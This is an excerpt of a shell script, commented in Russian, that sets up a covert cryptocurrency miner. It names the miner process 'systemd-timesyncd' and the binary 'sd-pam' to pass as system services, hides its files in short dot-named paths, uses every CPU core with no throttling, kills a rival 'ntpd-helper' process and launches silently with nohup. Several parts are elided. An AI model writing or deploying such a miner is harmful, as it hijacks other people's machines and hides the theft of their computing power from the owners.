...
# ИЗМЕНЕНИЕ 1: Короткие системные имена
PROCESS_NAME="systemd-timesyncd"
BINARY_NAME="sd-pam"  # Короткое имя!
DIR_NAME=".sd"  # Короткая директория!
CONFIG_NAME="c"  # Короткий конфиг!
WATCHDOG_NAME=".m"  # Короткий watchdog!
PID_NAME=".p"  # Короткий PID!
...
# ============= CPU НАСТРОЙКИ =============
# ИЗМЕНЕНИЕ 2: Используем ВСЕ ядра без ограничений!
CPU_CORES=$(nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "2")
THREADS=$CPU_CORES  # БЕЗ ОГРАНИЧЕНИЙ!
...
# ============= СОЗДАНИЕ КОНФИГА =============
# ИЗМЕНЕНИЕ 3: Явное указание потоков для RandomX + все ядра + huge-pages
cat > "$CONFIG_FILE" <<EOF
{
    "autosave": true,
    "donate-level": 0,
...
pkill -f "ntpd-helper" 2>/dev/null || true
sleep 1

# ИЗМЕНЕНИЕ 4: Запуск БЕЗ nice (максимальная производительность!)
nohup "$BINARY_PATH" -c "$CONFIG_FILE" >/dev/null 2>&1 &
MINER_PID=$!
